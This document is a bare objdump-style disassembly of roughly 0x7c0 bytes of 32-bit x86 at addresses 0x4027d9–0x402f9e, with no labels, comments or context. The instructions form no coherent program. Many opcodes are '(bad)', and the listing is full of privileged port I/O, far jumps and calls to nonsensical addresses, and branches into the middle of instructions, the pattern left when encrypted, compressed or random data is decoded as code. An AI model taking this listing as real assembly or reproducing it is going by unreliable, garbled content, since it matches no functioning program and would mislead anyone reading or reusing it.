  4027d9:	fstp   st(6)
  4027db:	shl    DWORD PTR [ebx-0x5bd7e7b0],0x75
  4027e2:	rcr    DWORD PTR [edx],0x34
  4027e5:	call   0xd840:0xd2cfc241
  4027ec:	mov    ah,0x89
  4027ee:	popf   
  4027ef:	or     BYTE PTR [edi+edi*4-0x44b12fea],ch
  4027f6:	ret    
  4027f7:	jecxz  0x402868
  4027f9:	lock cld 
  4027fb:	push   ecx
  4027fc:	jl     0x402837
  4027fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027ff:	cmp    dh,dl
  402801:	lds    ebx,FWORD PTR [edx]
  402803:	dec    esi
  402804:	pop    ebx
  402805:	ficomp DWORD PTR [ebp-0x31]
  402808:	lds    esp,FWORD PTR [esi]
  40280a:	gs xchg esi,eax
  40280c:	fiadd  DWORD PTR [edx+0x3f]
  40280f:	iret   
  402810:	and    al,0xd1
  402812:	jecxz  0x402812
  402814:	pop    ebx
  402815:	inc    esp
  402816:	repnz retf 
  402818:	add    DWORD PTR [eax+0x40],0x2286aedd
  40281f:	push   ebx
  402820:	add    DWORD PTR [edx-0x55],esp
  402823:	mov    bl,0x65
  402825:	jo     0x4027ef
  402827:	or     ch,BYTE PTR [esi]
  402829:	test   BYTE PTR [esi],dl
  40282b:	stc    
  40282c:	sar    ebp,0x5c
  40282f:	cs retf 0x9c9d
  402833:	add    DWORD PTR [ebx+0x432458bb],ebp
  402839:	sar    BYTE PTR [ebp-0x5],0xd9
  40283d:	mov    ebp,0x8f7accd2
  402842:	cs jo  0x402825
  402845:	xor    BYTE PTR [edx],dh
  402847:	pop    edi
  402848:	mov    ebx,0x3e455d22
  40284d:	or     DWORD PTR [ecx-0x70dbdb0e],ebx
  402853:	gs and ebp,ecx
  402856:	adc    DWORD PTR [esi],edi
  402858:	(bad)  
  402859:	imul   edx,ecx,0x91b9f59
  40285f:	jne    0x4027fe
  402861:	jne    0x402833
  402863:	sbb    eax,0xf1d55e18
  402868:	loop   0x4028e2
  40286a:	les    ecx,FWORD PTR [ebp-0x22]
  40286d:	jp     0x40283b
  40286f:	out    0xe1,al
  402871:	loopne 0x40287e
  402873:	jl     0x402868
  402875:	out    dx,al
  402876:	or     ebx,DWORD PTR [edi+0x7060e668]
  40287c:	out    0xe2,al
  40287e:	in     al,dx
  40287f:	mov    BYTE PTR [ecx+0x781ff1fd],bh
  402885:	jle    0x40287e
  402887:	das    
  402888:	pop    edx
  402889:	ss fs out 0x5a,eax
  40288d:	pop    edx
  40288e:	cli    
  40288f:	pop    edi
  402890:	sub    al,0xb
  402892:	mov    edi,0xad204aae
  402897:	xor    DWORD PTR [edx],ebx
  402899:	pop    ecx
  40289a:	jno    0x4028ae
  40289c:	fistp  WORD PTR [esi]
  40289e:	arpl   WORD PTR [edi],dx
  4028a0:	xlat   BYTE PTR ds:[ebx]
  4028a1:	jg     0x402855
  4028a3:	(bad)  
  4028a4:	push   esi
  4028a5:	push   ebp
  4028a6:	cmp    DWORD PTR [edx],0x524d2081
  4028ac:	outs   dx,BYTE PTR ds:[esi]
  4028ad:	cdq    
  4028ae:	aas    
  4028af:	(bad)  
  4028b0:	xchg   edi,eax
  4028b2:	stos   DWORD PTR es:[edi],eax
  4028b3:	mov    BYTE PTR [ebx-0x64a56dc9],ch
  4028b9:	cwde   
  4028ba:	mov    edx,0xbd9afaf3
  4028bf:	pop    edi
  4028c0:	clc    
  4028c1:	add    ecx,esp
  4028c3:	jo     0x4028b6
  4028c5:	ja     0x4028eb
  4028c7:	add    esi,DWORD PTR [eax]
  4028c9:	mov    edi,0x3eaae3bc
  4028ce:	and    ecx,DWORD PTR [edi]
  4028d0:	dec    ebp
  4028d1:	clc    
  4028d2:	fnsave [ebx+0x36b4faa5]
  4028d8:	pop    ebp
  4028d9:	adc    eax,0xf64ffb7c
  4028de:	adc    al,0xbe
  4028e0:	ins    BYTE PTR es:[edi],dx
  4028e1:	sub    eax,0x65d66e1f
  4028e6:	lods   eax,DWORD PTR ds:[esi]
  4028e7:	jnp    0x4028f6
  4028e9:	shl    dl,cl
  4028eb:	push   ebx
  4028ec:	or     BYTE PTR [eax+0x73],cl
  4028ef:	mov    al,0xe2
  4028f1:	sub    ebp,DWORD PTR [edx+0x8]
  4028f4:	add    eax,0xf98b48fb
  4028f9:	add    dl,ch
  4028fb:	scas   eax,DWORD PTR es:[edi]
  4028fc:	fist   DWORD PTR [edi]
  4028fe:	jnp    0x402900
  402900:	jle    0x40297a
  402902:	imul   edi,DWORD PTR [esi+0x40],0x82f57b3f
  402909:	cli    
  40290a:	adc    eax,0xdeed0124
  40290f:	cmp    DWORD PTR [edi-0x18ba85ca],eax
  402915:	iret   
  402916:	push   0xffffffc4
  402918:	sbb    ebp,DWORD PTR [edi+0x14]
  40291b:	or     BYTE PTR [eax],cl
  40291d:	mov    ebx,0x6c8135d2
  402922:	push   ebx
  402923:	xchg   BYTE PTR [edi+0x1be742a3],al
  402929:	lea    edx,[ebp-0x26]
  40292c:	or     DWORD PTR [edx-0x4f0281c9],ecx
  402932:	sbb    DWORD PTR [ebx-0x7],ecx
  402935:	xor    eax,0xb5212758
  40293a:	jbe    0x4028bf
  40293c:	data16 lahf 
  40293e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40293f:	ficomp DWORD PTR [esi]
  402941:	sbb    ebx,DWORD PTR [eax+0x70ded70b]
  402947:	adc    DWORD PTR [ecx],0x4a32cd2
  40294d:	cld    
  40294e:	enter  0xd6df,0x3a
  402952:	enter  0x4809,0x29
  402956:	enter  0xf944,0xe8
  40295a:	jns    0x402993
  40295c:	mov    dh,0xc9
  40295e:	ja     0x4028f3
  402960:	mov    ebx,0x81819daf
  402965:	sub    al,0xda
  402967:	stc    
  402968:	jns    0x402949
  40296a:	dec    edi
  40296b:	push   esi
  40296c:	dec    edi
  40296d:	ds call 0x3b82:0xd2960992
  402975:	pop    esp
  402976:	push   esi
  402977:	out    dx,eax
  402978:	(bad)  
  402979:	sbb    al,0xcb
  40297b:	push   ecx
  40297c:	jbe    0x40297d
  40297e:	fstp   DWORD PTR [ebx-0x1d]
  402981:	dec    ebx
  402982:	adc    DWORD PTR [edi],edi
  402984:	or     bh,ch
  402986:	repnz sbb eax,0xfbea95d2
  40298c:	inc    DWORD PTR [eax+0x5310703c]
  402992:	nop
  402993:	retf   
  402994:	push   0xc5b5e2
  402999:	jbe    0x402932
  40299b:	in     al,0x1c
  40299d:	push   cs
  40299e:	pop    ebx
  40299f:	push   ebx
  4029a0:	sub    al,0x84
  4029a2:	add    DWORD PTR [ebx+esi*8-0x7b],ebp
  4029a6:	repz push 0x29
  4029a9:	cmp    cl,BYTE PTR [edx]
  4029ab:	jae    0x40295d
  4029ad:	es addr16 push esp
  4029b0:	adc    al,0x4b
  4029b2:	test   al,0x5e
  4029b4:	stc    
  4029b5:	scas   al,BYTE PTR es:[edi]
  4029b6:	jl     0x402a18
  4029b8:	jp     0x4029c1
  4029ba:	cwde   
  4029bb:	repz adc eax,0x317a9fa
  4029c1:	ror    BYTE PTR [ebp-0x37920e10],0x9f
  4029c8:	add    al,0x9e
  4029ca:	inc    edx
  4029cb:	jmp    0xf10f8d9b
  4029d0:	xchg   ebx,eax
  4029d1:	dec    eax
  4029d2:	dec    ebp
  4029d3:	lock cmp esi,esi
  4029d6:	ins    BYTE PTR es:[edi],dx
  4029d7:	clc    
  4029d8:	(bad)  
  4029d9:	mov    edx,0x2037c98
  4029de:	sbb    ebx,DWORD PTR [edx]
  4029e0:	scas   eax,DWORD PTR es:[edi]
  4029e1:	xor    al,0x1a
  4029e3:	ja     0x40298f
  4029e5:	fdiv   DWORD PTR [ebp+0x34]
  4029e8:	xchg   ebx,eax
  4029e9:	arpl   WORD PTR [eax+ecx*1],cx
  4029ec:	or     eax,0xa86812f
  4029f1:	bnd jg 0x402980
  4029f4:	mov    ecx,0x434bf801
  4029f9:	jmp    0x92b38404
  4029fe:	repz ja 0x40299e
  402a01:	or     ebp,ebp
  402a03:	add    ch,cl
  402a05:	and    BYTE PTR [esi-0x58],0xca
  402a09:	push   esi
  402a0a:	icebp  
  402a0b:	aad    0xdc
  402a0d:	fidivr WORD PTR [ecx+0x2b3c4b25]
  402a13:	int3   
  402a14:	ret    
  402a15:	jl     0x4029f3
  402a17:	jae    0x402a6a
  402a19:	addr16 inc ebp
  402a1b:	int    0xd2
  402a1d:	inc    esi
  402a1e:	mov    al,ds:0xcc739968
  402a23:	lods   eax,DWORD PTR ds:[esi]
  402a24:	dec    ebp
  402a25:	fild   WORD PTR [edx+0x49293073]
  402a2b:	pop    edx
  402a2c:	xchg   edx,eax
  402a2d:	sbb    BYTE PTR ds:0xec01be32,dl
  402a33:	nop
  402a34:	pop    edi
  402a35:	out    dx,eax
  402a36:	jmp    0x7b03:0x8b80bbce
  402a3d:	sub    al,0x29
  402a3f:	cli    
  402a40:	hlt    
  402a41:	mov    bh,0xb4
  402a43:	aas    
  402a44:	mov    BYTE PTR [edi],dl
  402a46:	test   eax,0x76a928aa
  402a4b:	les    edi,FWORD PTR [edx+eiz*8-0x8a16f03]
  402a52:	rcl    BYTE PTR [edi],1
  402a54:	add    ch,bl
  402a56:	retf   
  402a57:	leave  
  402a58:	xor    BYTE PTR [ebp+0x5395ed29],0xc7
  402a5f:	int3   
  402a60:	out    dx,eax
  402a61:	xor    BYTE PTR [edi+0x1b],bh
  402a64:	dec    ecx
  402a65:	clc    
  402a66:	sub    ebp,DWORD PTR [ebx+eax*2+0x22]
  402a6a:	pop    ebx
  402a6b:	retf   0x1072
  402a6e:	xchg   edi,eax
  402a6f:	(bad)  
  402a70:	call   FWORD PTR [ebx]
  402a72:	(bad)
  402a76:	cmp    bl,BYTE PTR [edx-0x17]
  402a79:	shr    DWORD PTR [esi],1
  402a7b:	test   DWORD PTR [edx],esp
  402a7d:	add    BYTE PTR [edx+eiz*4],dh
  402a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a81:	scas   al,BYTE PTR es:[edi]
  402a82:	mov    edx,0x51ca179b
  402a87:	cmp    eax,0x8f7ec657
  402a8c:	loopne 0x402a39
  402a8e:	lahf   
  402a8f:	xor    eax,0x9f76fee6
  402a94:	arpl   WORD PTR ds:[edx+eax*2],bp
  402a98:	or     al,0x9f
  402a9a:	outs   dx,DWORD PTR ds:[esi]
  402a9b:	sub    esi,DWORD PTR [edi+esi*4]
  402a9e:	pop    ecx
  402a9f:	xchg   edx,eax
  402aa0:	out    dx,eax
  402aa1:	mov    ds:0x2720740d,al
  402aa6:	sub    DWORD PTR [edi+0x6],esp
  402aa9:	cli    
  402aaa:	jo     0x402adf
  402aac:	mov    BYTE PTR [ecx+0x42a3310d],0x0
  402ab3:	dec    ebp
  402ab4:	mov    ds:0x6e90042,eax
  402ab9:	add    eax,0xd2cc0000
  402abe:	cmp    eax,0xd9db3dc4
  402ac3:	fidivr DWORD PTR [esi]
  402ac5:	icebp  
  402ac6:	out    0xdb,al
  402ac8:	loop   0x402b11
  402aca:	int    0xef
  402acc:	mov    ds:0x6a787810,al
  402ad1:	jl     0x402b4b
  402ad3:	js     0x402ab9
  402ad5:	mov    ecx,0xb32d0a33
  402ada:	sub    al,0xb2
  402adc:	xchg   BYTE PTR [esi],al
  402ade:	mov    bh,0x6e
  402ae0:	xchg   esi,eax
  402ae1:	loope  0x402aa6
  402ae3:	mov    eax,ds:0x246647a0
  402ae8:	cdq    
  402ae9:	push   ds
  402aea:	push   esi
  402aeb:	push   esp
  402aec:	mov    ebp,0xf2aef0a2
  402af1:	popa   
  402af2:	int    0x31
  402af4:	pop    esi
  402af5:	sbb    esp,DWORD PTR [ebp+0x3f]
  402af8:	ret    0x9e9c
  402afb:	dec    esp
  402afc:	sub    BYTE PTR [edi+0x7468a5b],dh
  402b02:	scas   al,BYTE PTR es:[edi]
  402b03:	jne    0x402b20
  402b05:	xor    ch,BYTE PTR [esi-0x1d0933ed]
  402b0b:	not    BYTE PTR [eax-0x65bf4e66]
  402b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b12:	pop    ecx
  402b13:	cmc    
  402b14:	and    edx,DWORD PTR [ecx]
  402b16:	test   DWORD PTR [ebp+ebx*8+0x4e992091],eax
  402b1d:	fisubr WORD PTR [edi-0x5b5458be]
  402b23:	ret    
  402b24:	mov    ebx,DWORD PTR [edx+0x1]
  402b27:	cmp    eax,0x49f1448a
  402b2c:	(bad)  
  402b2d:	scas   eax,DWORD PTR es:[edi]
  402b2e:	inc    ecx
  402b2f:	test   DWORD PTR [ebp-0x80],0xab5e4dcc
  402b36:	aad    0x3b
  402b38:	cmp    al,0x63
  402b3a:	jnp    0x402b14
  402b3c:	adc    DWORD PTR [edi],esp
  402b3e:	mov    al,ds:0x134119be
  402b43:	fwait
  402b44:	sub    dl,ch
  402b46:	pop    ebx
  402b47:	push   cs
  402b48:	xor    al,0x50
  402b4a:	dec    edx
  402b4b:	leave  
  402b4c:	mov    bl,0x18
  402b4e:	sub    BYTE PTR [edx-0x3ee56d79],cl
  402b54:	cli    
  402b55:	mov    ch,0x99
  402b57:	daa    
  402b58:	xor    BYTE PTR [esi+0x32c2b3f2],ah
  402b5e:	push   edx
  402b5f:	mov    dh,0x4
  402b61:	sar    edi,0x59
  402b64:	pop    esp
  402b65:	mov    WORD PTR [ebx-0xe],ds
  402b68:	sub    eax,0x73bc6e59
  402b6d:	(bad)  
  402b6e:	push   ss
  402b6f:	sbb    BYTE PTR [edx+eiz*2+0xa],0xd4
  402b74:	ins    DWORD PTR es:[edi],dx
  402b75:	sbb    edx,DWORD PTR [esi-0x55f2ea5c]
  402b7b:	retf   
  402b7c:	mov    DWORD PTR [ebx],esi
  402b7e:	add    bh,BYTE PTR [ebx+0x7d]
  402b81:	adc    ebp,DWORD PTR ds:0x2b101474
  402b87:	cmp    esp,DWORD PTR [esi+0x34]
  402b8a:	xchg   edi,eax
  402b8b:	in     al,0x36
  402b8d:	pop    es
  402b8e:	and    ebp,DWORD PTR [ebx]
  402b90:	sar    BYTE PTR [ecx-0x469fcdbe],1
  402b96:	ror    DWORD PTR [ebx],cl
  402b98:	aad    0xbe
  402b9a:	aad    0xcd
  402b9c:	cmp    eax,0x885e226e
  402ba1:	fs jns 0xf4c9bdb3
  402ba8:	fstp   st(4)
  402baa:	mov    DWORD PTR [ecx+esi*8],edx
  402bad:	xor    al,0xb9
  402baf:	inc    edi
  402bb0:	push   esi
  402bb1:	(bad)  
  402bb2:	mov    al,ds:0xa4a574e2
  402bb7:	call   0x4c0650b8
  402bbc:	add    DWORD PTR [eax],ebp
  402bbe:	shr    DWORD PTR [eax-0x48],0x18
  402bc2:	xor    eax,0x8bb1fdd7
  402bc7:	lods   eax,DWORD PTR ds:[esi]
  402bc8:	push   ecx
  402bc9:	push   ds
  402bca:	inc    esp
  402bcb:	addr16 adc edx,edi
  402bce:	ds cld 
  402bd0:	loope  0x402b57
  402bd2:	jp     0x402b6a
  402bd4:	pop    edi
  402bd5:	scas   al,BYTE PTR es:[edi]
  402bd6:	in     eax,dx
  402bd7:	ficom  DWORD PTR [eax-0x17]
  402bda:	and    DWORD PTR [esi+ecx*4+0x536e5d5c],eax
  402be1:	push   0x32316394
  402be6:	xchg   ecx,edx
  402be8:	mov    al,ds:0xe482c853
  402bed:	jbe    0x402b96
  402bef:	sub    DWORD PTR [eax-0x4],edi
  402bf2:	mov    dh,0x86
  402bf4:	(bad)  
  402bf5:	hlt    
  402bf6:	xchg   DWORD PTR [ebx+0x5b],ebx
  402bf9:	aam    0xfe
  402bfb:	aad    0xf3
  402bfd:	cwde   
  402bfe:	outs   dx,DWORD PTR ds:[esi]
  402bff:	outs   dx,DWORD PTR ds:[esi]
  402c00:	popf   
  402c01:	adc    ebx,DWORD PTR [ecx+0x5c]
  402c04:	mov    eax,cs
  402c06:	sub    al,0x8b
  402c08:	shl    DWORD PTR [edx+0x2b],0xb4
  402c0c:	jb     0x402c3b
  402c0e:	or     al,0xd4
  402c10:	fucomip st,st(5)
  402c12:	xor    BYTE PTR [edx+0x78e4a9ca],0xef
  402c19:	push   ss
  402c1a:	cmp    eax,0xee63b725
  402c1f:	push   ecx
  402c20:	xlat   BYTE PTR ds:[ebx]
  402c21:	push   es
  402c22:	seto   BYTE PTR [ebp+0x70]
  402c26:	cwde   
  402c27:	(bad)  
  402c28:	push   ds
  402c29:	mov    WORD PTR [esp+edi*4],fs
  402c2c:	dec    edx
  402c2d:	hlt    
  402c2e:	cli    
  402c2f:	mov    edi,0x9479dca4
  402c34:	je     0x402c7a
  402c36:	cmc    
  402c37:	xlat   BYTE PTR ds:[ebx]
  402c38:	adc    eax,0x3a466ed6
  402c3d:	mov    al,BYTE PTR [esi-0x4baa3a81]
  402c43:	xchg   ebx,eax
  402c44:	leave  
  402c45:	sbb    DWORD PTR [ebp+ebp*4-0x36aa8067],esp
  402c4c:	push   ds
  402c4d:	sahf   
  402c4e:	adc    ebp,esi
  402c50:	mov    al,0xb
  402c52:	icebp  
  402c53:	mov    ds:0x3d44b856,al
  402c58:	es out dx,eax
  402c5a:	or     esi,edx
  402c5c:	les    ecx,FWORD PTR [esi+eax*1+0x3691c692]
  402c63:	push   esp
  402c64:	add    eax,DWORD PTR [ebx+0x55b0a87]
  402c6a:	sub    dl,cl
  402c6c:	xchg   esp,eax
  402c6d:	mov    cl,0xd8
  402c6f:	idiv   DWORD PTR [ecx+0x45]
  402c72:	test   BYTE PTR [esi-0x49],dh
  402c75:	and    dh,bh
  402c77:	or     DWORD PTR [edx],esp
  402c79:	jge    0x402ce4
  402c7b:	adc    al,BYTE PTR [ecx]
  402c7d:	xchg   edx,eax
  402c7e:	arpl   WORD PTR [esi-0x78fe2f65],bx
  402c84:	jle    0x402cbb
  402c86:	add    ah,BYTE PTR [edx]
  402c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c89:	(bad)  
  402c8b:	xchg   ebp,eax
  402c8c:	mov    ah,0x7f
  402c8e:	neg    edx
  402c90:	jae    0x402ca6
  402c92:	fdivr  DWORD PTR [esi-0x568231be]
  402c98:	inc    esi
  402c99:	pop    eax
  402c9a:	pop    edi
  402c9b:	mov    ebx,0xa56ee13f
  402ca0:	sub    eax,DWORD PTR [ebp-0x5fc66536]
  402ca6:	loope  0x402cdb
  402ca8:	stc    
  402ca9:	int    0xa8
  402cab:	sub    eax,0xff63084f
  402cb0:	repz ja 0x402c79
  402cb3:	call   0xac8c1c73
  402cb8:	xlat   BYTE PTR ds:[ebx]
  402cb9:	xor    dh,BYTE PTR [esi+esi*4-0x78e0ef18]
  402cc0:	out    dx,al
  402cc1:	stos   DWORD PTR es:[edi],eax
  402cc2:	(bad)
  402cc8:	fstp   QWORD PTR [esi-0x1eb2d45]
  402cce:	(bad)
  402cd1:	or     eax,0x92421a42
  402cd6:	daa    
  402cd7:	mov    ebp,0x3c74339e
  402cdc:	shl    BYTE PTR [edx],0x61
  402cdf:	cli    
  402ce0:	mov    eax,ds:0x52050b60
  402ce5:	fnsave [ecx-0x4dbd0dc7]
  402ceb:	stos   BYTE PTR es:[edi],al
  402cec:	xchg   ecx,eax
  402ced:	ss sahf 
  402cef:	sub    cl,bl
  402cf1:	pop    eax
  402cf2:	jno    0x402c9b
  402cf4:	ja     0x402c9d
  402cf6:	fistp  QWORD PTR [ebp-0x60]
  402cf9:	sub    eax,0xb66a3bb7
  402cfe:	cmp    esp,DWORD PTR [edx]
  402d00:	xchg   DWORD PTR [edx-0x6f],edx
  402d03:	jl     0x402d61
  402d05:	(bad)  
  402d06:	push   ebx
  402d07:	imul   edx
  402d09:	adc    cl,BYTE PTR [edx]
  402d0b:	inc    edx
  402d0c:	call   0xa2d8:0xe92321ac
  402d13:	fmul   QWORD PTR [ebx-0x56a7588e]
  402d19:	sbb    eax,0x9b56c24f
  402d1e:	sti    
  402d1f:	mov    bh,0x86
  402d21:	adc    edi,ebp
  402d23:	das    
  402d24:	push   cs
  402d25:	sbb    dh,BYTE PTR [ebp+0x16780ff1]
  402d2b:	jmp    0xa5fb1fb2
  402d30:	mov    esi,0x6ec9caee
  402d35:	sub    edx,edi
  402d37:	push   eax
  402d38:	sbb    BYTE PTR [edi+0xab9fa3f],ch
  402d3e:	(bad)  
  402d3f:	in     al,0x3f
  402d41:	cdq    
  402d42:	aam    0x91
  402d44:	ja     0x402db8
  402d46:	push   edi
  402d47:	pushf  
  402d48:	bound  edi,QWORD PTR [eax+0x7f1c7f4a]
  402d4e:	iret   
  402d4f:	mov    al,ds:0xdef58d45
  402d54:	push   eax
  402d55:	add    al,0xd1
  402d57:	or     al,0xb4
  402d59:	cmp    BYTE PTR [ebx+0x64],bh
  402d5c:	ds sub eax,0x56c0d1e1
  402d62:	out    0x39,eax
  402d64:	imul   esi,DWORD PTR [esi],0xff76b63e
  402d6a:	les    esp,FWORD PTR [ebp-0x26c8f2e]
  402d70:	sbb    DWORD PTR [edi+0x1899756d],edx
  402d76:	inc    edi
  402d77:	(bad)  
  402d79:	xchg   edi,eax
  402d7a:	popa   
  402d7b:	loop   0x402d64
  402d7d:	adc    DWORD PTR [edx-0x6ba9509d],esi
  402d83:	mov    edi,0x9711d63f
  402d88:	mov    cl,0xd5
  402d8a:	fwait
  402d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d8c:	aad    0x9f
  402d8e:	loope  0x402d29
  402d90:	and    DWORD PTR [ebp-0x6d],ebp
  402d93:	jne    0x402d2b
  402d95:	rol    BYTE PTR [edi+0x64],0xea
  402d99:	push   ebp
  402d9a:	sahf   
  402d9b:	pop    edx
  402d9c:	xor    ebx,eax
  402d9e:	outs   dx,DWORD PTR ds:[esi]
  402d9f:	dec    ecx
  402da0:	lea    esp,[ecx]
  402da2:	add    edi,DWORD PTR [ecx]
  402da4:	repnz in al,0xe1
  402da7:	aaa    
  402da8:	push   ds
  402da9:	pop    eax
  402daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dab:	je     0x402dea
  402dad:	fstp   TBYTE PTR [edx]
  402daf:	xor    al,0x20
  402db1:	imul   ecx,esp,0x2c3fd820
  402db7:	out    0x12,al
  402db9:	das    
  402dba:	in     eax,0x31
  402dbc:	pop    edx
  402dbd:	mov    esp,0x71913be
  402dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dc3:	xor    al,0x98
  402dc5:	shl    DWORD PTR [edi],1
  402dc7:	shr    ebp,1
  402dc9:	jge    0x402d64
  402dcb:	imul   edx,DWORD PTR [esi],0xffffffe6
  402dce:	push   eax
  402dcf:	pop    eax
  402dd0:	mov    edx,0x89bad162
  402dd5:	loop   0x402e39
  402dd7:	push   eax
  402dd8:	ror    BYTE PTR [ebx-0x4696319e],cl
  402dde:	hlt    
  402ddf:	mov    ds:0xd998687a,eax
  402de4:	loope  0x402dda
  402de6:	xchg   ebp,eax
  402de7:	shr    DWORD PTR [ebp+0x4c46ee2f],cl
  402ded:	xchg   ebp,eax
  402dee:	jo     0x402e19
  402df0:	mov    edi,0x9fe5dbe8
  402df5:	pop    ebp
  402df6:	adc    edi,esp
  402df8:	adc    eax,0x8b4dc02d
  402dfd:	shl    DWORD PTR [ecx],cl
  402dff:	in     eax,0x91
  402e01:	mov    al,BYTE PTR [edi-0x59]
  402e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e05:	push   cs
  402e06:	pop    esi
  402e07:	shr    BYTE PTR [esp+esi*8-0xf],0xc2
  402e0c:	fnstsw ax
  402e0e:	mov    ch,0xc5
  402e10:	fstp   st(1)
  402e12:	cmp    eax,0x141feaca
  402e17:	outs   dx,BYTE PTR ds:[esi]
  402e18:	retf   0xc8d9
  402e1b:	jae    0x402da6
  402e1d:	clc    
  402e1e:	add    DWORD PTR ds:0x7e740d7,edi
  402e24:	ins    DWORD PTR es:[edi],dx
  402e25:	sub    esi,DWORD PTR [edi-0x684508a2]
  402e2b:	sbb    esi,DWORD PTR [esi]
  402e2d:	cdq    
  402e2e:	sub    al,0x93
  402e30:	cmp    esp,esi
  402e32:	pop    ecx
  402e33:	inc    ecx
  402e34:	popa   
  402e35:	inc    eax
  402e36:	ins    BYTE PTR es:[edi],dx
  402e37:	fadd   QWORD PTR [esi-0x1360f4df]
  402e3d:	push   ebx
  402e3e:	mov    ebp,esp
  402e40:	test   BYTE PTR [esi],bl
  402e42:	call   0x53062269
  402e47:	test   cl,0xd7
  402e4a:	repnz icebp 
  402e4c:	lods   al,BYTE PTR ds:[esi]
  402e4d:	clc    
  402e4e:	ret    0x1276
  402e51:	sub    eax,DWORD PTR [eax]
  402e53:	fstp   TBYTE PTR ds:0xfa51c3da
  402e59:	lds    esi,FWORD PTR [ebx-0x3e799ce1]
  402e5f:	fcom   QWORD PTR [ecx]
  402e61:	pop    ecx
  402e62:	es inc ecx
  402e64:	xor    dh,BYTE PTR [ebp-0x63ce36e9]
  402e6a:	scas   eax,DWORD PTR es:[edi]
  402e6b:	stos   BYTE PTR es:[edi],al
  402e6c:	into   
  402e6d:	clc    
  402e6e:	push   ebx
  402e6f:	iret   
  402e70:	inc    esi
  402e71:	je     0x402ea5
  402e73:	in     al,dx
  402e74:	inc    esi
  402e75:	mov    edx,0x663c34bd
  402e7a:	cdq    
  402e7b:	(bad)  
  402e7c:	repz lds eax,FWORD PTR [eax]
  402e7f:	dec    ebp
  402e80:	mov    cl,0x9a
  402e82:	lods   eax,DWORD PTR ds:[esi]
  402e83:	data16 jl 0x402ec2
  402e86:	mov    ch,0x71
  402e88:	jno    0x402ebb
  402e8a:	pop    es
  402e8b:	imul   ebp,esp,0xe4b5389
  402e91:	arpl   WORD PTR [eax+0x3b628038],bx
  402e97:	push   0x7be83c45
  402e9c:	xrelease xchg BYTE PTR [edx+0x41],al
  402ea0:	in     eax,0xc4
  402ea2:	sbb    BYTE PTR [esi+0x25eb67b2],ah
  402ea8:	sub    al,0xeb
  402eaa:	or     DWORD PTR ds:0x22ca5143,edi
  402eb0:	js     0x402e82
  402eb2:	mov    ds:0xe873f47a,al
  402eb7:	push   eax
  402eb8:	(bad)  
  402eb9:	cli    
  402eba:	dec    ebp
  402ebb:	sub    BYTE PTR [ebp-0x27],bh
  402ebe:	mov    ch,0x92
  402ec0:	test   al,0xa8
  402ec2:	adc    al,0xa6
  402ec4:	cs push edx
  402ec6:	adc    edi,DWORD PTR [ebx-0x1ba0fbd4]
  402ecc:	pop    es
  402ecd:	call   0x27a791a8
  402ed2:	mov    edx,0xa38051ac
  402ed7:	ret    
  402ed8:	rol    BYTE PTR [edx+edi*8],0xb0
  402edc:	loop   0x402f59
  402ede:	int    0x18
  402ee0:	in     al,dx
  402ee1:	push   es
  402ee2:	jne    0x402ebb
  402ee4:	push   ebp
  402ee5:	pop    eax
  402ee6:	pusha  
  402ee7:	push   esi
  402ee8:	je     0x402ea4
  402eea:	xchg   esp,eax
  402eeb:	add    DWORD PTR [ebx-0x4d],eax
  402eee:	in     al,dx
  402eef:	lea    ecx,[eax+0xf3ef94d]
  402ef5:	cmp    eax,0x40194cdc
  402efa:	xchg   edx,eax
  402efb:	sub    BYTE PTR [ebx+eax*4-0x60],cl
  402eff:	jno    0x402ee1
  402f01:	shl    BYTE PTR [edi+edx*8-0x18a854cc],1
  402f08:	pop    ebx
  402f09:	add    eax,0x8ae8cdd3
  402f0e:	repnz sar BYTE PTR [esp+edx*1],cl
  402f12:	push   cs
  402f13:	jle    0x402ebc
  402f15:	(bad)  
  402f16:	popf   
  402f17:	jb     0x402f4d
  402f19:	popa   
  402f1a:	jp     0x402ec4
  402f1c:	rol    DWORD PTR [ecx],0xb4
  402f1f:	jae    0x402ef4
  402f21:	sbb    al,BYTE PTR [ebx]
  402f23:	mov    dh,0x12
  402f25:	xchg   esi,eax
  402f26:	jno    0x402f04
  402f28:	mov    ecx,0xfe18523f
  402f2d:	add    esi,DWORD PTR [esi]
  402f2f:	push   edi
  402f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f31:	xlat   BYTE PTR ds:[ebx]
  402f32:	stc    
  402f33:	lock in al,0x60
  402f36:	stc    
  402f37:	and    al,0x55
  402f39:	add    ah,BYTE PTR [ebp+0x4c]
  402f3c:	or     al,0x4b
  402f3e:	adc    al,0x86
  402f40:	add    eax,0xb9095cdc
  402f45:	add    DWORD PTR [esi-0x6b],edi
  402f48:	aam    0x1f
  402f4a:	std    
  402f4b:	and    eax,0x9037d67
  402f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f51:	repnz fwait
  402f53:	push   esp
  402f54:	jno    0x402f97
  402f56:	scas   al,BYTE PTR es:[edi]
  402f57:	addr16 push ss
  402f59:	into   
  402f5a:	sub    al,0xe9
  402f5c:	mov    ds:0x44baeab5,eax
  402f61:	add    al,0x4b
  402f63:	repz add esp,DWORD PTR ds:0xb5552d6c
  402f6a:	xor    BYTE PTR [ebp+ebx*1+0x8ff98b0],dh
  402f71:	je     0x402f46
  402f73:	or     eax,0x5d728593
  402f78:	pop    esi
  402f79:	aam    0xe7
  402f7b:	push   edi
  402f7c:	xchg   ebx,eax
  402f7d:	mov    edx,0xbb7be00f
  402f82:	mov    eax,ds:0x7a742bd
  402f87:	ja     0x402fc9
  402f89:	fs jp  0x402fc0
  402f8c:	pop    ecx
  402f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f8e:	lods   eax,DWORD PTR ds:[esi]
  402f8f:	popf   
  402f90:	test   eax,0xf195eda1
  402f95:	add    DWORD PTR [ecx-0x17],ecx
  402f98:	jb     0x402fe8
  402f9a:	dec    edi
  402f9c:	xchg   BYTE PTR [ebx],dh
  402f9e:	sbb    DWORD PTR [eax],ecx
